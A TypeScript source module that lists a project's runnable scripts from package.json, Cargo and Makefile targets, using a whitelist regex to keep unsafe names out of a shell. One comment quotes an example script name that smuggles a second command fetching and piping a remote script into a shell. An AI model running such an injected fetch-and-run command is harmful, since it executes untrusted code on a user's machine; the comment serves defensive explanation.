// What a project can be told to do, read off the files it already has.
//
// Every project keeps its commands written down somewhere — `scripts` in a package.json, the
// targets of a Makefile — and starting one meant opening a terminal and typing it from memory. This
// reads those files and hands back a list to put on buttons.
//
// Pure module: the reading is done by the caller and the text comes in as strings, so the parsing
// and, more importantly, the rule about which names are safe to run can be tested on their own.

/** One thing the project can be asked to do. */
export interface ProjectCommand {
  /** Stable across reads, so React keys and the terminal title do not jump around. */
  id: string;
  /** What goes on the button: the script or target name. */
  label: string;
  /** What gets typed into the shell. */
  command: string;
  /** Which file it was read from, for grouping and for the tooltip. */
  source: "npm" | "cargo" | "make";
}

/**
 * Names safe to paste into a shell.
 *
 * This is the whole security story of this module, so it is a whitelist rather than an escape.
 * A name reaches a real shell through `ptyWrite`, and a script called `foo && curl evil.sh | sh`
 * would run as written — `npm run` would never see the second half. Quoting would work but every
 * shell quotes differently (PowerShell is not bash is not cmd), and the app spawns whichever one
 * the machine offers. So anything that is not a plain name is not offered at all: a project with a
 * script named like that gets one fewer button, which is the correct outcome.
 */
const SAFE_NAME = /^[A-Za-z0-9][A-Za-z0-9:._-]*$/;

export function isSafeCommandName(name: string): boolean {
  return SAFE_NAME.test(name);
}

/**
 * The ones people reach for first, in the order they reach for them. Everything else follows
 * alphabetically — a project with twenty scripts should still have "dev" under the pointer.
 */
const COMMON_FIRST = ["dev", "start", "serve", "watch", "build", "test", "lint", "typecheck", "check"];

function rank(label: string): number {
  const at = COMMON_FIRST.indexOf(label);
  return at === -1 ? COMMON_FIRST.length : at;
}

/** Well-known first, then alphabetical. Stable, so the buttons do not move between reads. */
export function sortCommands(commands: ProjectCommand[]): ProjectCommand[] {
  return [...commands].sort((a, b) => rank(a.label) - rank(b.label) || a.label.localeCompare(b.label));
}

/**
 * Which package manager to run the scripts with, from the lockfile that is present.
 *
 * Guessing wrong is not cosmetic: `npm run` in a pnpm workspace resolves a different tree and can
 * fail outright. npm is the fallback because a project with no lockfile at all is a project nobody
 * has installed yet, and npm is what ships with node.
 */
export function packageRunner(lockfiles: string[]): "npm" | "pnpm" | "yarn" | "bun" {
  if (lockfiles.includes("pnpm-lock.yaml")) return "pnpm";
  if (lockfiles.includes("bun.lockb") || lockfiles.includes("bun.lock")) return "bun";
  if (lockfiles.includes("yarn.lock")) return "yarn";
  return "npm";
}

/** The `scripts` of a package.json, as commands. Bad JSON means no buttons, not a crash. */
export function npmCommands(packageJson: string, runner: "npm" | "pnpm" | "yarn" | "bun"): ProjectCommand[] {
  let parsed: unknown;
  try {
    parsed = JSON.parse(packageJson);
  } catch {
    return [];
  }
  const scripts = (parsed as { scripts?: unknown } | null)?.scripts;
  if (!scripts || typeof scripts !== "object" || Array.isArray(scripts)) return [];

  const out: ProjectCommand[] = [];
  for (const name of Object.keys(scripts as Record<string, unknown>)) {
    if (!isSafeCommandName(name)) continue;
    // yarn takes the script name on its own; the rest want `run` in front of it.
    const command = runner === "yarn" ? `yarn ${name}` : `${runner} run ${name}`;
    out.push({ id: `npm:${name}`, label: name, command, source: "npm" });
  }
  return out;
}

/**
 * A Cargo project's usual four. The manifest is not parsed: what is worth a button here is the same
 * everywhere, and the per-project part (the binaries a workspace declares) is a different feature.
 */
export function cargoCommands(): ProjectCommand[] {
  return ["run", "build", "test", "check"].map(name => ({
    id: `cargo:${name}`,
    label: name,
    command: `cargo ${name}`,
    source: "cargo" as const,
  }));
}

/**
 * The targets of a Makefile.
 *
 * Deliberately narrow. A target line is `name:` at the start of a line, and only that — no pattern
 * rules (`%.o:`), no variable assignments (`X := y`, which also contains a colon), nothing indented
 * (that is a recipe), and none of the dot-prefixed directives like `.PHONY`. Offering something
 * that is not a target means a button that fails, which is worse than a button that is missing.
 */
export function makeCommands(makefile: string): ProjectCommand[] {
  const seen = new Set<string>();
  const out: ProjectCommand[] = [];
  for (const line of makefile.split("\n")) {
    // Indented is a recipe line, and `=` before the colon is an assignment.
    if (/^\s/.test(line)) continue;
    const match = line.match(/^([^\s:=]+)\s*:(?!=)/);
    if (!match) continue;
    const name = match[1];
    if (name.startsWith(".") || !isSafeCommandName(name) || seen.has(name)) continue;
    seen.add(name);
    out.push({ id: `make:${name}`, label: name, command: `make ${name}`, source: "make" });
  }
  return out;
}

/** Everything found in one project, ready for the buttons. */
export function projectCommands(files: {
  packageJson?: string | null;
  lockfiles?: string[];
  /** Cargo takes a flag, not the text: its four commands are the same in every project. */
  hasCargo?: boolean;
  makefile?: string | null;
}): ProjectCommand[] {
  const out: ProjectCommand[] = [];
  if (files.packageJson) out.push(...npmCommands(files.packageJson, packageRunner(files.lockfiles ?? [])));
  if (files.hasCargo) out.push(...cargoCommands());
  if (files.makefile) out.push(...makeCommands(files.makefile));
  return sortCommands(out);
}
